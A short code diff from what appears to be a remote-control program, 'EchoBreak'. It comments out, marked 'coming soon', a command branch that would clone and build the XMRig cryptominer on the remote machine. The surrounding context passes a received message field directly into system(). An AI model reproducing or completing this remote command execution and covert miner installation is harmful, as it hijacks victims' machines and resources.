@@ -110,6 +110,8 @@ int main() {
                         system((std::string("yandex-browser-stable ") + msg[2]).c_str());
                 }
                 //==========================================================================
+                //coming soon
+                /*
                 else if(msg[1] == "inst_xmrig") {
                     // git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git
                     // cd EchoBreak-xmrig/xmrig-6.22.2
@@ -123,7 +125,7 @@ int main() {
                     else {
                         // send back error
                     }
-                }
+                }*/
 		               //==========================================================================
             }
             memset(buffer, 0, sizeof(buffer));
